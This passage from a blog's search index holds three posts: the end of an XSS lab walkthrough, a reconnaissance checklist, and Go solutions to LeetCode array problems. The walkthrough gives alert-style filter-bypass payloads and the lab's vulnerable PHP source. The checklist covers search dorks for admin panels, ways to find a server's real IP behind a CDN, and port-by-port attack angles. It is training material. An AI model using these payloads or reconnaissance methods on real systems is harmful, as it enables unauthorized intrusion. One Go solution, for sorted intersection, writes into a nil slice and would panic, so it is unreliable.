js中的东西，其作用相当于php的include函数。这里就是将1.gif这个文件给包含进来。\nng-include相关知识点1、ng-include 指令用于包含外部的 HTML文件。\n2、包含的内容将作为指定元素的子节点。\n3、ng-include 属性的值可以是一个表达式，返回一个文件名。\n4、默认情况下，包含的文件需要包含在同一个域名下。\n特别值得注意的几点如下：\n1.ng-include,如果单纯指定地址，必须要加引号\n2.ng-include,加载外部html，script标签中的内容不执行\n3.ng-include,加载外部html中含有style标签样式可以识别\n构造函数?src&#x3D;’level1.php?name&#x3D;‘因为这里参数值算是一个地址，所以需要添加引号。\n但是level1.php不是一个php文件吗？\n这里解释一下，这是因为我们不是单纯的去包含level1.php，而是在后面添加了name参数值的。这就有点像是在访问了该参数值中地址之后把它响应在浏览器端的html文件给包含进来的意思。\npayload?src=&#39;level1.php?name=&lt;img src=1 onerror=alert(1)&gt;&#39;\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = $_GET[&quot;src&quot;];\necho &#39;&lt;body&gt;&lt;span class=&quot;ng-include:&#39;.htmlspecialchars($str).&#39;&quot;&gt;&lt;/span&gt;&lt;/body&gt;&#39;;\n?&gt;\nlevel 16\n可以看到，我们输入的值被插到了标签中，我们尝试直接弹窗，发现很多字符被编码，来看看源代码\n源代码&lt;?php \nini_set(&quot;display_errors&quot;, 0);\n$str = strtolower($_GET[&quot;keyword&quot;]);\n$str2=str_replace(&quot;script&quot;,&quot;&amp;nbsp;&quot;,$str);\n$str3=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str2);\n$str4=str_replace(&quot;/&quot;,&quot;&amp;nbsp;&quot;,$str3);\n$str5=str_replace(&quot; &quot;,&quot;&amp;nbsp;&quot;,$str4);\necho &quot;&lt;center&gt;&quot;.$str5.&quot;&lt;/center&gt;&quot;;\n?&gt;\n&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;\n&lt;?php \necho &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str5).&quot;&lt;/h3&gt;&quot;;\n?&gt;\n可以看到，将参数值中的script替换成&amp;nbsp;，将参数值中的空格也替换成&amp;nbsp;，将参数值中的&#x2F;符号替换成&amp;nbsp;\n与我们的猜想一致\n绕过思路：可以用回车来将它们分开。\n而且这里&#x2F;符号也被编码了，所以我们需要的是一个不需要闭合的标签，比\n如之前所用过的\n\n\n回车可以用url编码%0a表示\npayload&lt;img%0Asrc=1%0Aonerror=alert(1)&gt;\nlevel 17\n可以看到提交的参数插入到了标签的src属性中，尝试直接弹窗，发现转义了很多符号。\n尝试构造事件弹窗，可以看到这里的src没有用引号闭合，我们就不用管\npayloadonclick=alert(&#39;xss&#39;)\nonmousedown=&#39;alert(1)&#39;\n\n\n源代码&lt;?php·\nini_set(&quot;display_errors&quot;, 0);\necho &quot;&lt;embed src=xsf01.swf?&quot;.htmlspecialchars($_GET[&quot;arg01&quot;]).&quot;=&quot;.htmlspecialchars($_GET[&quot;arg02&quot;]).&quot; width=100% heigth=100%&gt;&quot;;\n?&gt;\n可以看到和我们的猜测一致\nlevel 18与17关一致\nlevel 19与之前一致，不过用了引号将src闭合，所以不能直接在后面添加语句，我们可以通过F12控制台添加\n","categories":["笔记"],"tags":["笔记"]},{"title":"信息收集","url":"/2023/03/23/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/","content":"域名信息whoisWhois 可以查询域名是否被注册，以及注册域名的详细信息的数据库，其中可能会存在一些有用的信息，例如域名所有人、域名注册商、邮箱等。\n搜索引擎搜索搜索引擎通常会记录域名信息，可以通过 site: domain 的语法来查询。\n一些常用的搜索引擎语法\n\n\n\n语法\n语法说明\n示例\n示例说明\n\n\n\nfiletype\n搜索某一种文件类型的资源\nC++ filetype:pdf\n搜索类型为pdf的C++网页资源\n\n\nsite\n在指定站点搜索\nC++ site:https://www.zhihu.com\n在知乎中搜索和C++相关的网页\n\n\ninurl\n搜索查询词出现在url 中的页面\ninurl:admin\n搜索链接url中有admin的网页\n\n\nintitle\n搜索查询词出现在页面标题(title)中的页面，支持中文和英文\nintitle:后台管理\n搜索页面标题中有后台管理的网页\n\n\nintext\n搜索查询词出现在页面正文(title)中的页面，支持中文和英文\nSEO intext:搜索引擎\n在正文包含【搜索引擎】的网页中搜索【SEO】\n\n\n示例\n\n找到一些网站后台\n\n第三方查询市面上有很多第三方查询网站\n\nDNSDumpster\n\nVirustotal\n\nCrtSearch\n\nthreatminer\n\nCensys\n还有国内的各种第三方如站长之家等\n\n\n\n域名相关性同一个企业&#x2F;个人注册的多个域名通常具有一定的相关性，例如使用了同一个邮箱来注册、使用了同一个备案、同一个负责人来注册等，可以使用这种方式来查找关联的域名。\n\n查询域名注册邮箱\n通过域名查询备案号\n通过备案号查询域名\n反查注册邮箱\n反查注册人\n通过注册人查询到的域名在查询邮箱\n通过上一步邮箱去查询域名\n查询以上获取出的域名的子域名\n\n网站信息网站中有相当多的信息，网站本身、各项安全策略、设置等都可能暴露出一些信息。\n网站本身的交互通常不囿于单个域名，会和其他子域交互。对于这种情况，可以通过爬取网站，收集站点中的其他子域信息。这些信息通常出现在JavaScript文件、资源文件链接等位置。\n网站的安全策略如跨域策略、CSP规则等通常也包含相关域名的信息。有时候多个域名为了方便会使用同一个SSL&#x2F;TLS证书，因此有时可通过证书来获取相关域名信息。\nCDN可通过多地ping的方式确定目标是否使用了CDN，常用网站http://ping.chinaz.com/\n一般使用了CDN的域名的父域或者子域名不一定使用了CDN，可以通过这种方式去查找对应的IP。另外CDN可能是在网站上线一段时间后才使用的，可以通过查找域名解析记录的方式去查找真实IP。\n通过社会工程学的方式进行邮件沟通，从邮件头中获取IP地址，IP地址可能是网站的真实IP或者是目标的出口IP。\n域名枚举通过批量尝试的方式，找到有效的子域名。工具很多，这里不作推荐。\n端口信息常见端口脆弱点\n\n\n端口\n服务\n可能存在的风险威胁\n\n\n\n21\nftp\n是否支持匿名&#x2F;弱口令\n\n\n22\nssh\n存在漏洞可枚举用户名，爆破密码\n\n\n23\ntelent\n爆破密码，嗅探抓取明文密码\n\n\n25\nsmtp\n伪造发件人\n\n\n80\nweb\n常见web漏洞&#x2F;web管理后台弱口令\n\n\n443\nOpenssl\n心脏滴血以及一些web漏洞测试\n\n\n445\nSMB\nwin文件共享\n\n\n873\nrsync\n是否支持匿名&#x2F;弱口令\n\n\n2601&#x2F;2604\nzebra路由\n默认口令\n\n\n3306\nmysql\n弱密码,日志写WebShell,UDF提权,MOF提权\n\n\n3690\nsvn\nsvn泄露&#x2F;未授权访问\n\n\n6379\nredis\n一般无认证，可直接访问\n\n\n7001\nweblogic\n默认弱口令\n\n\n8061&#x2F;8161\nActiveMQ\n弱口令&#x2F;远程命令执行\n\n\n8080\ntomcat\n弱口令&#x2F;默认口令\n\n\n8089\njboss\n未授权访问&#x2F;弱口令\n\n\n8649\nganglia\n信息泄漏\n\n\n8888\n宝塔\n未授权等多个漏洞\n\n\n11211\nmemcache\n未授权访问\n\n\n27017\nmongodb\n未授权访问\n\n\n除此列出的端口之外，还有很多。\n端口扫描最常用的工具就是nmap。\n要搜集开放固定端口的系统可以使用资产搜索引擎使用port语法获取互联网上大量的系统,各种网络空间测绘网站fofa、shodan、zoomeye、鹰图。\n站点信息判断网站操作系统、扫敏感文件、网站采用的语言、后端框架、前端框架、中间服务器、web容器服务器、敏感目录、有无WAF等等信息。\n社会工程学企业信息、人员信息、钓鱼等\n","tags":["收集"]},{"title":"算法刷题之数组系列","url":"/2023/08/14/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E4%B9%8B%E6%95%B0%E7%BB%84%E7%B3%BB%E5%88%97/","content":"数组两个数组的交集349题目大意：题目要求找到两个数组的交集，如果交集元素同一个数字出现多次，只输出一次。\n思路：把num1写进一个map，此map的键为num1的数字值，然后遍历num2，判断数字是否在map中存在，如果存在，在map中删除，将数字加入res中。\nfunc intersection(nums1 []int, nums2 []int) []int &#123;\n    m := map[int]bool&#123;&#125;\n    var res []int\n    for _, v := range nums1 &#123;\n        m[v] = true\n    &#125;\n    for _, v := range nums2 &#123;\n        if m[v]&#123;\n            delete(m,v)\n            res = append(res,v)\n        &#125;\n    &#125;\n    return res\n&#125;\n\n350题目大意：题目要求找两个数组的交集，并且保留相同元素。\n思路：将num1写进一个map，键为num1数组的值，值为出现次数，之后遍历num2，检查其中的元素是否在map中出现，如果出现，则将该元素加入结果res中，并将map中该元素出现次数减一。\nfunc intersect(nums1 []int, nums2 []int) []int &#123;\n    m := map[int]int&#123;&#125;\n    var res []int\n    for _, v := range nums1 &#123;\n        m[v]++\n    &#125;\n    for _, v := range nums2 &#123;\n        if m[v]&gt;0&#123;\n            res =append(res,v)\n            m[v]--\n        &#125;\n    &#125;\n    return res\n&#125;\n\n进阶：如果给定的数组已经排好序呢？你将如何优化你的算法？\n思路：利用双指针，设定两个为0的指针，比较两个指针的元素是否相等，如果相等，将两个指针一起向后移动，将相等元素放入一个空白数组。如果不相等，将元素值小的一个指针向后移动，继续进行判断，直到任意一个数组终止。\nfunc intersect(nums1 []int, nums2 []int) []int &#123;\n    i, j, k := 0, 0, 0\n    var nums []int\n    sort.Ints(nums1)\n    sort.Ints(nums2)\n    for i &lt; len(nums1) &amp;&amp; j &lt; len(nums2) &#123;\n        if nums1[i] &gt; nums2[j] &#123;\n            j++\n        &#125; else if nums1[i] &lt; nums2[j] &#123;\n            i++\n        &#125; else &#123;\n            nums[k] = nums1[i]\n            i++\n            j++\n            k++\n        &#125;\n    &#125;\n    return nums[:k]\n&#125;\n\n最长的公共前缀14题目大意：编写一个函数来查找字符串数组中的最长公共前缀。如果不存在公共前缀，则返回””\n思路：选定一个基准元素，将基准元素与后面的元素进行比较， 不断更新基准元素，直到和所有元素都满足最长公共前缀的条件。\n这里选定数组中第一个元素为基准元素，当pre在v中出现的位置为0时，可以认定pre就是v的最长前缀（如flower和flow比较）。当pre在v中出现的位置不为0时，可以认定此时的pre不为最长公共前缀，这时就可以将pre的最后一个字母截掉，再次与v进行比较，直到满足string.Index(v,pre) == 0\n最后处理一下临界条件。给定数组为空，说明没用公共前缀。\n用到strings包下index方法\nfunc Index(s, sep string) int\n子串sep在字符串s中第一次出现的位置，不存在则返回-1。\n\nfunc longestCommonPrefix(strs []string) string &#123;\n    if len(strs)&lt;1&#123;\n        return &quot;&quot;\n    &#125;\n    pre := strs[0]\n    for _, v := range strs &#123;\n        for strings.Index(v,pre)!=0 &#123;\n            if len(pre)==0&#123;\n                return &quot;&quot;\n            &#125;\n            pre = pre[:len(pre)-1]\n        &#125;\n    &#125;\n    return pre\n&#125;\n\n买卖股票的最佳时机121题目大意：给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。如果你最多只允许完成一笔交易（即买入和卖出一支股票），设计一个算法来计算你所能获取的最大利润。注意你不能在买入股票前卖出股票。\n思路：找出最低价和最高价，差价即为最大收益。初始化第一天的价格为买入价，遍历数组，更新最低价和最大利润。\nfunc maxProfit(prices []int) int &#123;\n    buyPrice := prices[0]\n    maxProfit :=0\n    for i := 1; i &lt;len(prices); i++ &#123;\n        if prices[i]&lt;buyPrice &#123;\n            buyPrice = prices[i]\n        &#125;else &#123;\n            profit := prices[i]-buyPrice\n            if profit&gt;maxProfit &#123;\n                maxProfit = profit\n            &#125;\n        &#125;\n    &#125;\n    return maxProfit\n&#125;\n\n122题目大意：给定一个数组，它的第 i 个元素是一支给定股票第 i 天的价格。设计一个算法来计算你所能获取的最大利润。你可以尽可能地完成更多的交易（多次买卖一支股票）。注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）。\n思路：获取最大收益即为跌了就买入，涨到顶峰就卖出。\n当后一天的价格大于前一天时，两者价格差即为收益。\nfunc maxProfit(prices []int) int &#123;\n    profit := 0\n    for i := 0; i &lt; len(prices)-1; i++ &#123;\n        if prices[i+1]&gt;prices[i] &#123;\n            profit += prices[i+1]-prices[i]\n        &#125;\n    &#125;\n    return profit\n&#125;\n\n123题目大意：给定一个数组，它的第 i 个元素是一支给定的股票在第 i 天的价格。设计一个算法来计算你所能获取的最大利润。你最多可以完成 两笔 交易。注意：你不能同时参与多笔交易（你必须在再次购买前出售掉之前的股票）\n思路：动态规划，在同一天会有四种状态：\n\n进行过一次买操作；\n\n进行了一次买操作和一次卖操作，即完成了一笔交易；\n\n在完成了一笔交易的前提下，进行了第二次买操作；\n\n完成了全部两笔交易。\nbuy1为第一次买入的价格（取当前价格和之前第一次买入价格的较小值），sell1为第一次卖出时的利润（取当前价格减去第一次买入价格和之前第一次卖出利润的较大值），buy2为第二次买入的价格（取当前价格减去之前第一次卖出利润和之前第二次买入价格的较小值），sell2为第二次卖出时的利润（取当前价格减去之前第二次买入价格和之前第二次卖出利润的较大值）。\n\n\nfunc maxProfit(prices []int) int &#123;\n    if len(prices)==0 &#123;\n        return 0\n    &#125;\n    buy1 := prices[0]\n    sell1 := 0\n    buy2 := prices[0]\n    sell2 := 0\n    for i := 1; i &lt; len(prices); i++ &#123;\n        buy1 = min(buy1, prices[i])\n        sell1 = max(sell1,prices[i]-buy1)\n        buy2 = min(buy2,prices[i]-sell1)\n        sell2 = max(sell2,prices[i]-buy2)\n    &#125;\n    return sell2\n&#125;\n\nfunc max(a,b int)int  &#123;\n    if a&gt;b&#123;\n        return a\n    &#125;\n    return b\n&#125;\nfunc min(a,b int)int  &#123;\n    if a&lt;b &#123;\n        return a\n    &#125;\n    return b\n&#125;\n\n旋转数组189题目大意：给定一个整数数组 nums，将数组中的元素向右轮转 k 个位置，其中 k 是非负数。\n思路：翻转后，末尾 k mod n 个元素移动至了数组头部，剩下的元素右移 k mod n 个位置至最尾部。\n解法一：将下标为i的元素移动到(i+k) mod n 的位置，再将剩下的元素拷贝回来即可。\nfunc rotate(nums []int, k int) &#123;\n    ints := make([]int, len(nums))\n    for i, v := range nums &#123;\n        ints[(i+k)%len(nums)] = v\n    &#125;\n    copy(nums,ints)\n&#125;\n\n解法二：将数组元素直接翻转，然后以k mod n为分界点，前后分别翻转\nfunc rotate(nums []int, k int) &#123;\n    re(nums)\n    re(nums[:k%len(nums)])\n    re(nums[k%len(nums):])\n&#125;\n\nfunc re(arr []int)  &#123;\n    for i := 0; i &lt; len(arr)/2; i++ &#123;\n        arr[i],arr[len(arr)-i-1] = arr[len(arr)-i-1],arr[i]\n    &#125;\n&#125;\n\n原地删除27题目大意：给你一个数组 nums 和一个值 val，你需要 原地 移除所有数值等于 val 的元素，并返回移除后数组的新长度。\n思路：\n解法一：遍历整个数组，当前值等于目标值时，移除当前值，不等于时，i++。注意：这里将索引为i的元素删除，是在原数组上操作的，原来索引为i+1的元素会变为i，所以在删除时，不能执行i++操作。\nfunc removeElement(nums []int, val int) int &#123;\n    for i := 0; i &lt; len(nums); &#123;\n        if nums[i] ==val &#123;\n            nums = append(nums[:i],nums[i+1:]...)\n        &#125;else &#123;\n            i++\n        &#125;\n    &#125;\n    return len(nums)\n&#125;\n\n解法二：利用双指针，将不等于目标值的元素移动到数组前端，更新指针i,最后返回i的值即为新数组的长度。这里删除的元素实际上是没被删除的，是被移动到了数组后侧，被截取掉了。\nfunc removeElement(nums []int, val int) int &#123;\n    i := 0\n    for j := 0; j &lt; len(nums); j++ &#123;\n        if nums[j] != val&#123;\n            nums[i] = nums[j]\n            i++\n        &#125;\n    &#125;\n    return i\n&#125;\n\n26题目大意：给定一个有序数组 nums，对数组中的元素进行去重，使得原数组中的每个元素只有一个。最后返回去重以后数组的长度值。\n思路：\n解法一：遍历数组，当i+1值等于i对应的值时，删除第i+1元素。\nfunc removeDuplicates(nums []int) int &#123;\n    for i := 0; i &lt;len(nums)-1; &#123;\n        if nums[i] == nums[i+1]&#123;\n            nums = append(nums[:i+1],nums[i+2:]...)\n        &#125;else &#123;\n            i++\n        &#125;\n    &#125;\n    return len(nums)\n&#125;\n\n解法二：双指针，遍历数组，当前元素不等于后一个元素时，将后一元素移动到前面。这里也是实际并未删除\nfunc removeDuplicates(nums []int) int &#123;\n    i := 1\n    for j := 0; j &lt; len(nums)-1; j++ &#123;\n        if nums[j] != nums[j+1]&#123;\n            nums[i] = nums[j+1]\n            i++\n        &#125;\n    &#125;\n    return i\n&#125;\n\n283题目大意：给定一个数组 nums，编写一个函数将所有 0 移动到数组的末尾，同时保持非零元素的相对顺序。\n思路：\n解法一：遍历数组，将为零元素删除，j记录删除的个数，最后将删除的零添加到数组后端。\nfunc moveZeroes(nums []int) &#123;\n    j :=0\n    for i := 0; i &lt; len(nums)-1; &#123;\n        if nums[i] == 0&#123;\n            nums = append(nums[:i],nums[i+1:]...)\n            j++\n        &#125;else &#123;\n            i++\n        &#125;\n    &#125;\n    zeros := make([]int,j)\n    nums = append(nums, zeros...)\n&#125;\n\n解法二：双指针，i遍历数组，j记录非零元素要放置的位置，遍历数组时，当前元素不为零，则将其与指针j指向的位置进行交换，并更新j指针。\nfunc moveZeroes(nums []int) &#123;\n    j := 0\n    for i := 0; i &lt; len(nums); i++ &#123;\n        if nums[i] != 0&#123;\n            if  i != j &#123;\n                nums[i], nums[j] = nums[j], nums[i]\n            &#125;\n            j++\n        &#125;\n    &#125;\n&#125;\n\n80题目大意：给你一个有序数组 nums ，请你** 原地** 删除重复出现的元素，使得出现次数超过两次的元素只出现两次 ，返回删除后数组的新长度。\n思路：双指针，将出现次数超过两次的元素移动到数组的前面，并更新指针 i。最后，函数返回指针 i 的值，即为删除重复元素后的新数组的长度。\nfunc removeDuplicates(nums []int) int &#123;\n    if len(nums) &lt;= 2 &#123;\n        return len(nums)\n    &#125;\n    i := 2\n    for j := 2; j &lt; len(nums); j++ &#123;\n        if nums[j] != nums[i-2] &#123;\n            nums[i] = nums[j]\n            i++\n        &#125;\n    &#125;\n    return i\n&#125;\n\n加一66题目大意：给定一个由整数组成的非空数组所表示的非负整数，在该数的基础上加一。最高位数字存放在数组的首位， 数组中每个元素只存储单个数字。你可以假设除了整数 0 之外，这个整数不会以零开头。\n思路：从数组最后一位开始遍历，如果当前位小于9，直接加一返回结果，如果当前位为9，将该位设置为0，并进位。如果所有位都进位了，就在数组开头插入一个1。\nfunc plusOne(digits []int) []int &#123;\n    for i := len(digits)-1; i &gt;=0 ; i-- &#123;\n        if digits[i] &lt; 9 &#123;\n            digits[i]++\n            return digits\n        &#125;\n        digits[i] = 0\n    &#125;\n    return append([]int&#123;1&#125;,digits...)\n&#125;\n\n两数之和1题目大意：给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那 两个 整数，并返回他们的数组下标。\n思路：暴力题解，遍历每个元素 i，并查找是否存在一个值与 target - i 相等的目标元素。\nfunc twoSum(nums []int, target int) []int &#123;\n    for i, v:= range nums &#123;\n        for k:=i+1;k&lt;len(nums);k++&#123;\n            if target-v==nums[k] &#123;\n                return []int&#123;i,k&#125;\n            &#125;\n        &#125;\n    &#125;\n    return nil\n&#125;\n\n使用哈希表\nfunc twoSum(nums []int, target int) []int &#123;\n    m:= make(map[int]int)\n    for i, num := range nums &#123;\n        if index,found := m[target-num] ;found&#123;\n            return []int&#123;index,i&#125;\n        &#125;\n        m[num]=i\n    &#125;\n    return nil\n&#125;\n\n三数之和15题目大意：给定一个数组，要求在这个数组中找出 3 个数之和为 0 的所有组合。\n思路：使用排序以及双指针解决，首先对数组进行排序，固定一个数 ，使用双指针来查找另外两个数。排序后，如果固定数本身大于0，那么三数之和必定不为0。移动左右指针，如果和大于0，说明右指针太大，需要左移，如果和小于0，说明左指针太小，需要右移。接下来就是处理重复值的情况，对于固定值以及左右指针都需要做重复值处理。\nfunc threeSum(nums []int) [][]int &#123;\n    var result [][]int\n    sort.Ints(nums)\n    for i := 0; i &lt; len(nums); i++ &#123;\n        if i &gt; 0 &amp;&amp; nums[i] == nums[i-1] &#123;\n            continue  //避免重复固定值\n        &#125;\n        left, right := i+1, len(nums)-1\n        for left &lt; right &#123;\n            sum := nums[i] + nums[left] + nums[right]\n            if sum == 0 &#123;\n                result = append(result, []int&#123;nums[i], nums[left], nums[right]&#125;)\n                left++\n                right--\n                for left &lt; right &amp;&amp; nums[left] == nums[left-1] &#123;\n                    left++  //避免重复左指针\n                &#125;\n                for left &lt; right &amp;&amp; nums[right] == nums[right+1] &#123;\n                    right--  //避免重复右指针\n                &#125;\n            &#125; else if sum &lt; 0 &#123;\n                left++\n            &#125; else &#123;\n                right--\n            &#125;\n        &#125;\n    &#125;\n    return result\n&#125;\n\n那么四数之和也就差不大多，固定两个数，同样使用双指针。\n","tags":["golang","算法","数组"]}]